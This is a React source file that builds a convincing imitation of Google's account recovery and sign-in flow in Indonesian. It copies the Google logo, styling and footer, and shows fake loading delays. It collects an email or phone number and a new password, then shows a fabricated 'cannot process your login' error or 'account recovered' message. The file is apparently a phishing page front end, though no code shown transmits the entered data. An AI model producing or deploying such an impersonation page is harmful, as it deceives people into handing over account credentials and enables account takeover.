import React, { useState } from 'react';
import { motion, AnimatePresence } from 'motion/react';

const GoogleLogo = () => (
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="40px" height="40px" className="mb-2">
    <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z" />
    <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z" />
    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z" />
    <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z" />
  </svg>
);

const TextInput = ({ label, type = "text", value, onChange, error, name, autoFocus }: any) => {
  return (
    <div className="relative mb-2 mt-2">
      <input
        type={type}
        id={name}
        name={name}
        value={value}
        onChange={onChange}
        autoFocus={autoFocus}
        className={`block px-[15px] pt-[15px] pb-[13px] w-full text-[16px] text-[#1f1f1f] bg-transparent rounded border ${
          error ? 'border-[#b3261e] focus:border-[#b3261e]' : 'border-[#747775] hover:border-[#1f1f1f] focus:border-[#0b57d0]'
        } appearance-none focus:outline-none focus:border-2 peer`}
        placeholder=" "
      />
      <label
        htmlFor={name}
        className={`absolute text-[16px] font-normal left-[11px] top-[14px] px-1 bg-white transition-all duration-200 transform -translate-y-[25px] scale-[0.75] origin-top-left z-10 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-[0.75] peer-focus:-translate-y-[25px] ${
          error ? 'text-[#b3261e] peer-focus:text-[#b3261e]' : 'text-[#444746] peer-focus:text-[#0b57d0]'
        } pointer-events-none`}
      >
        {label}
      </label>
      {error && (
        <div className="text-[#b3261e] text-[12px] mt-2 flex items-center gap-2 px-1">
          <svg aria-hidden="true" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
          </svg>
          {error}
        </div>
      )}
    </div>
  );
};

export default function App() {
  const [step, setStep] = useState<'email' | 'password' | 'change_password' | 'success' | 'error'>('email');
  const [direction, setDirection] = useState(1);
  const [isLoading, setIsLoading] = useState(false);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [error, setError] = useState('');
  const [showPassword, setShowPassword] = useState(false);

  const changeStep = (newStep: 'email' | 'password' | 'change_password' | 'success' | 'error', newDirection: number) => {
    setIsLoading(true);
    setTimeout(() => {
      setDirection(newDirection);
      setStep(newStep);
      setIsLoading(false);
    }, 5200);
  };

  const handleChangePasswordSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!password) {
      setError('Masukkan sandi');
      return;
    }
    if (password.length < 8) {
      setError('Sandi harus minimal 8 karakter');
      return;
    }
    if (password !== confirmPassword) {
      setError('Sandi tidak cocok. Harap coba lagi.');
      return;
    }
    setError('');
    changeStep('error', 1);
  };

  const handleEmailSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!email) {
      setError('Masukkan alamat email atau nomor telepon');
      return;
    }
    setError('');
    changeStep('password', 1);
  };

  const handlePasswordSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!password) {
      setError('Masukkan sandi');
      return;
    }
    setError('');
    changeStep('success', 1);
  };

  return (
    <div className="min-h-screen bg-white sm:bg-[#f0f4f9] p-0 sm:p-5 flex flex-col items-center justify-between sm:justify-center font-sans tracking-wide relative">
      
      {/* Full-screen Loading Overlay for background */}
      <AnimatePresence>
        {isLoading && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            transition={{ duration: 0.3, ease: [0.4, 0, 0.2, 1] }}
            className="fixed inset-0 z-40 bg-[rgba(0,0,0,0.25)]"
          />
        )}
      </AnimatePresence>

      <div className="bg-white sm:rounded-[28px] w-full sm:max-w-[448px] sm:min-h-[500px] flex flex-col sm:h-auto sm:border sm:border-gray-200 flex-grow sm:flex-grow-0 overflow-x-hidden relative z-50 shadow-sm">
        
        {/* Loading Overlay inside the form box */}
        <AnimatePresence>
          {isLoading && (
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              transition={{ duration: 0.3, ease: [0.4, 0, 0.2, 1] }}
              className="absolute inset-0 z-40 bg-[rgba(0,0,0,0.25)] pointer-events-auto"
            />
          )}
        </AnimatePresence>

        {/* Loading Bar */}
        <AnimatePresence>
          {isLoading && (
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              transition={{ duration: 0.3, ease: [0.4, 0, 0.2, 1] }}
              className="absolute top-0 left-0 right-0 h-1 bg-transparent z-50 pointer-events-none"
            >
              <motion.div
                className="h-full bg-[#0b57d0]"
                initial={{ x: '-100%', width: '50%' }}
                animate={{ x: '200%' }}
                transition={{ repeat: Infinity, duration: 1, ease: 'linear' }}
              />
            </motion.div>
          )}
        </AnimatePresence>

        {/* Top/Header Section */}
        <div className="px-6 pt-6 sm:px-10 sm:pt-8 flex flex-col items-start z-0">
          <GoogleLogo />
        </div>
        
        <div className="relative flex-grow flex flex-col z-0">
          <AnimatePresence mode="wait" custom={direction}>
            <motion.div
              key={step}
              custom={direction}
              initial={(d: number) => ({ opacity: 0, x: d > 0 ? 40 : -40 })}
              animate={{ opacity: 1, x: 0 }}
              exit={(d: number) => ({ opacity: 0, x: d > 0 ? -40 : 40 })}
              transition={{ duration: 0.1, ease: [0.4, 0, 0.2, 1] }}
              className="flex flex-col flex-grow w-full"
            >
              <div className="px-6 pb-6 pt-2 sm:px-10 sm:pb-8 flex flex-col items-start">
                {step === 'email' && (
                  <>
                    <h1 className="text-[32px] sm:text-[40px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">Pemulihan akun</h1>
                    <p className="text-[#444746] text-[14px] sm:text-[16px] font-normal">Memulihkan Akun Google Anda</p>
                  </>
                )}
                {step === 'password' && (
                  <>
                    <h1 className="text-[32px] sm:text-[40px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">Selamat datang kembali</h1>
                    <div 
                      onClick={() => !isLoading && changeStep('email', -1)}
                      className={`border border-[#747775] rounded-full h-[32px] pr-[12px] pl-[6px] mt-2 flex items-center gap-2 text-[14px] text-[#1f1f1f] font-medium ${isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'} transition w-max`}
                    >
                      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-[20px] h-[20px] text-[#1f1f1f]"><path fill="currentColor" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
                      <span>{email}</span>
                      <svg fill="currentColor" viewBox="0 0 24 24" className="w-[18px] h-[18px] text-[#444746]"><path d="M7 10l5 5 5-5z"/></svg>
                    </div>
                  </>
                )}
                {step === 'change_password' && (
                  <>
                    <h1 className="text-[32px] sm:text-[40px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">Ubah sandi</h1>
                    <div 
                      onClick={() => !isLoading && changeStep('email', -1)}
                      className={`border border-[#747775] rounded-full h-[32px] pr-[12px] pl-[6px] mt-2 flex items-center gap-2 text-[14px] text-[#1f1f1f] font-medium ${isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'} transition w-max`}
                    >
                      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-[20px] h-[20px] text-[#1f1f1f]"><path fill="currentColor" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
                      <span>{email}</span>
                      <svg fill="currentColor" viewBox="0 0 24 24" className="w-[18px] h-[18px] text-[#444746]"><path d="M7 10l5 5 5-5z"/></svg>
                    </div>
                  </>
                )}
                {step === 'success' && (
                  <>
                    <h1 className="text-[24px] sm:text-[32px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">Berhasil</h1>
                    <p className="text-[#444746] text-[14px] sm:text-[16px] font-normal">Akun Anda telah dipulihkan.</p>
                  </>
                )}
                {step === 'error' && (
                  <>
                    <h1 className="text-[32px] sm:text-[40px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">Tidak dapat memproses login Anda</h1>
                    <div 
                      onClick={() => !isLoading && changeStep('email', -1)}
                      className={`border border-[#747775] rounded-full h-[32px] pr-[12px] pl-[6px] mt-2 flex items-center gap-2 text-[14px] text-[#1f1f1f] font-medium ${isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'} transition w-max`}
                    >
                      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-[20px] h-[20px] text-[#1f1f1f]"><path fill="currentColor" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
                      <span>{email}</span>
                      <svg fill="currentColor" viewBox="0 0 24 24" className="w-[18px] h-[18px] text-[#444746]"><path d="M7 10l5 5 5-5z"/></svg>
                    </div>
                  </>
                )}
              </div>

        {/* Content/Form Section */}
        <div className="px-6 pb-10 flex flex-col flex-grow sm:px-10">
          {step === 'email' && (
            <form onSubmit={handleEmailSubmit} className="flex flex-col flex-grow justify-start">
              <div className="pt-2">
                <TextInput
                  label="Email atau nomor telepon"
                  value={email}
                  onChange={(e: any) => {
                    setEmail(e.target.value);
                    if (error) setError('');
                  }}
                  name="email"
                  error={error}
                  autoFocus
                  disabled={isLoading}
                />
              </div>
              <div className="mt-8 flex justify-between items-center pb-6 sm:pb-0">
                <button
                  type="button"
                  className="text-[#0b57d0] hover:bg-blue-50 px-3 py-2 -ml-3 rounded-full font-medium text-sm transition"
                  disabled={isLoading}
                >
                  Lupa email?
                </button>
                <button
                  type="submit"
                  className="bg-[#0b57d0] text-white px-6 py-2.5 rounded-full text-[14px] font-medium hover:bg-[#0842a0] hover:shadow-md transition disabled:opacity-70 disabled:cursor-not-allowed"
                  disabled={isLoading}
                >
                  Berikutnya
                </button>
              </div>
            </form>
          )}

          {step === 'password' && (
            <div className="flex flex-col flex-grow justify-start pt-6">
              <div>
                <p className="text-[#1f1f1f] text-[16px] leading-[24px]">
                  Anda dapat memperbarui sandi Anda sekarang jika Anda lupa.
                </p>
              </div>
              <div className="mt-8 flex justify-between items-center pb-6 sm:pb-0">
                <button
                  type="button"
                  onClick={() => changeStep('change_password', 1)}
                  className="text-[#0b57d0] hover:bg-blue-50 px-3 py-2 -ml-3 rounded-full font-medium text-sm transition"
                  disabled={isLoading}
                >
                  Perbarui sandi
                </button>
                <button
                  type="button"
                  onClick={() => changeStep('success', 1)}
                  className="bg-[#0b57d0] text-white px-6 py-2.5 rounded-full text-[14px] font-medium hover:bg-[#0842a0] hover:shadow-md transition disabled:opacity-70 disabled:cursor-not-allowed"
                  disabled={isLoading}
                >
                  Lanjutkan
                </button>
              </div>
            </div>
          )}

          {step === 'change_password' && (
            <form onSubmit={handleChangePasswordSubmit} className="flex flex-col flex-grow justify-start">
              <div className="pt-2">
                <h2 className="text-[#1f1f1f] text-[18px] sm:text-[22px] font-normal mt-4 mb-1">Buat sandi yang kuat</h2>
                <p className="text-[#444746] text-[14px] mb-6 leading-normal">
                  Buat sandi baru yang kuat dan tidak Anda gunakan untuk situs lain
                </p>

                <TextInput
                  label="Buat sandi"
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e: any) => {
                    setPassword(e.target.value);
                    if (error) setError('');
                  }}
                  name="password"
                  error={error && (error.includes('sandi') || error.includes('8 karakter')) ? error : ''}
                  autoFocus
                  disabled={isLoading}
                />

                <div className="mt-4">
                  <TextInput
                    label="Konfirmasi"
                    type={showPassword ? "text" : "password"}
                    value={confirmPassword}
                    onChange={(e: any) => {
                      setConfirmPassword(e.target.value);
                      if (error) setError('');
                    }}
                    name="confirmPassword"
                    error={error && error.includes('cocok') ? error : ''}
                    disabled={isLoading}
                  />
                </div>

                <div className="text-[12px] text-[#444746] mt-1.5 pl-3">
                  Minimal 8 karakter
                </div>

                <div className="mt-4">
                  <label className="flex items-center gap-3 cursor-pointer text-[14px] text-[#1f1f1f] select-none py-1">
                    <input 
                      type="checkbox" 
                      checked={showPassword} 
                      onChange={(e) => setShowPassword(e.target.checked)}
                      className="w-[18px] h-[18px] rounded border-[#747775] text-[#0b57d0] focus:ring-[#0b57d0] cursor-pointer"
                      disabled={isLoading}
                    />
                    <span>Tampilkan sandi</span>
                  </label>
                </div>
              </div>

              <div className="mt-8 flex justify-between items-center pb-6 sm:pb-0">
                <button
                  type="button"
                  onClick={() => changeStep('error', 1)}
                  className="text-[#0b57d0] hover:bg-blue-50 px-4 py-2.5 -ml-3 rounded-full font-medium text-[14px] transition"
                  disabled={isLoading}
                >
                  Lewati
                </button>
                <button
                  type="submit"
                  className="bg-[#0b57d0] text-white px-6 py-2.5 rounded-full text-[14px] font-medium hover:bg-[#0842a0] hover:shadow-md transition disabled:opacity-70 disabled:cursor-not-allowed"
                  disabled={isLoading}
                >
                  Simpan sandi
                </button>
              </div>
            </form>
          )}

          {step === 'success' && (
            <div className="flex flex-col flex-grow justify-start">
               <div className="pt-2">
                 <p className="text-[#444746] text-[14px]">Anda sekarang dapat menggunakan sandi baru Anda untuk login.</p>
               </div>
               <div className="mt-8 flex justify-end items-center pb-6 sm:pb-0">
                <button
                  onClick={() => {
                    setEmail('');
                    setPassword('');
                    setConfirmPassword('');
                    changeStep('email', -1);
                  }}
                  className="bg-[#0b57d0] text-white px-6 py-2.5 rounded-full text-[14px] font-medium hover:bg-[#0842a0] hover:shadow-md transition disabled:opacity-70 disabled:cursor-not-allowed"
                  disabled={isLoading}
                >
                  Selesai
                </button>
              </div>
            </div>
          )}

          {step === 'error' && (
            <div className="flex flex-col flex-grow justify-start pt-6">
              <div>
                <p className="text-[#1f1f1f] text-[16px] leading-[24px]">
                  Anda mencoba login di perangkat yang tidak dikenali oleh Google, dan kami tidak memiliki cukup informasi untuk memverifikasi ini benar-benar Anda. Untuk perlindungan Anda, Anda tidak dapat login di sini saat ini.
                </p>
                <p className="text-[#1f1f1f] text-[16px] leading-[24px] mt-4">
                  Coba lagi dari perangkat atau lokasi tempat Anda login sebelumnya. <span className="text-[#0b57d0] cursor-pointer hover:underline font-medium">Pelajari lebih lanjut</span>
                </p>
              </div>
            </div>
          )}
        </div>
            </motion.div>
          </AnimatePresence>
        </div>
      </div>

      {/* Footer */}
      <div className="w-full sm:max-w-[448px] px-6 pb-6 pt-2 sm:px-0 sm:pb-0 sm:pt-6 flex flex-col sm:flex-row justify-between text-[12px] text-[#444746] bg-white sm:bg-transparent">
        <div className="flex justify-start items-center">
          <div className="flex items-center gap-1 cursor-pointer hover:bg-gray-100 sm:hover:bg-[#e2e7eb] px-2 py-1.5 -ml-2 rounded transition">
            Indonesia
            <svg fill="currentColor" viewBox="0 0 24 24" width="16px" height="16px">
              <path d="M7 10l5 5 5-5z" />
            </svg>
          </div>
        </div>
        <div className="flex gap-4 sm:gap-6 mt-4 sm:mt-0 items-center justify-start sm:justify-end">
          <a href="#" className="hover:bg-gray-100 sm:hover:bg-[#e2e7eb] px-2 py-1.5 -ml-2 sm:-ml-0 rounded transition">Bantuan</a>
          <a href="#" className="hover:bg-gray-100 sm:hover:bg-[#e2e7eb] px-2 py-1.5 rounded transition">Privasi</a>
          <a href="#" className="hover:bg-gray-100 sm:hover:bg-[#e2e7eb] px-2 py-1.5 rounded transition">Persyaratan</a>
        </div>
      </div>

    </div>
  );
}
